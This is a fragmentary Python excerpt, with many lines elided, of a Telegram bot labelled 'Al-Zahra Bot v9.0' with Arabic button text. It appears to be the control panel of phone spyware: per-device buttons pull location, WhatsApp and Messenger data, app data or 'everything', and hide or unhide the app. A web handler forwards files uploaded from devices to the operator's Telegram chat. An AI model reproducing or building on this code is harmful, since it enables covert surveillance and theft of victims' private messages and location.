...
CMD_NAMES = {
    ...
    "whatsapp": "💬 واتساب", "messenger": "📩 ماسنجر", "app_data": "📱 بيانات التطبيقات",
    "all": "📦 سحب الكل", "hide": "🔒 إخفاء", "unhide": "🔓 إظهار",
}
...
def device_kb(did):
    return {"inline_keyboard": [
        ...
        [{"text": "📍 موقع", "callback_data": f"c_{did}_location"}, {"text": "💬 واتساب", "callback_data": f"c_{did}_whatsapp"}],
        [{"text": "📩 ماسنجر", "callback_data": f"c_{did}_messenger"}, {"text": "📱 تطبيقات", "callback_data": f"c_{did}_app_data"}],
        [{"text": "📦 الكل", "callback_data": f"c_{did}_all"}],
                ...
                if owner:
                    ...
                    if path and os.path.exists(path): 
                        ...
                        async with aiohttp.ClientSession() as s:
                            ...
                            data.add_field("chat_id", str(owner))
                            data.add_field("caption", f"📱 {dtype}")
                            data.add_field("document", open(path, "rb"))
                            await s.post(f"{API}/sendDocument", data=data)
            return web.json_response({"status": "ok"})
...
async def main():
    logger.info("=" * 60); logger.info("  Al-Zahra Bot v9.0"); logger.info("=" * 60)
    app = web.Application()
